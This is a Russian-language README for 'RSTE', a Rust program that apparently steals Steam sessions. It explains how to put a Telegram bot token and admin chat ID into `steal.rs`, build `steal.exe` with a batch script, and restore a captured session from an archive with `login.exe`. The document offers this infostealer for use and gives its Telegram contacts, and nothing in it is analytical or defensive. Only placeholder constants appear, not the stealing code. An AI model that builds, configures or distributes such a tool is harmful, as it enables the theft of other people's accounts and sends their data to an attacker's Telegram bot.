# RSTE

## Установка и настройка

### Вариант 1.
Откройте `src/steal.rs` и замените плейсхолдеры значения:
```rust
const TELEGRAM_TOKEN: &str = "YOUR_BOT_TOKEN";
const ADMIN_CHAT_ID: i64 = YOUR_CHAT_ID;
```
Сбилдить и можно пользоваться

### Вариант 2.
Запустите `build.bat` для автоматической сборки:
- Скрипт запросит Telegram Bot Token и Chat ID
- Автоматически обновит `steal.rs` с введенными данными
- Соберет проект через Cargo
- Скопирует готовые бинарники в папку `build`

## Использование

### steal.exe
Основная программа

### login.exe  
Утилита для восстановления сессии из архива

## Структура проекта
```
rste/
├── src/
│   ├── steal.rs      # Основная логика
│   └── login.rs      # Восстановление сессии
└── build.bat         # Скрипт сборки
```

## Требования
- Rust (latest stable)
- Windows OS
- Steam установлен

---

**Authors:** 
[@hellyeahs](https://t.me/hellyeahs)
[@kryyaasoft](https://t.me/kryyaasoft)


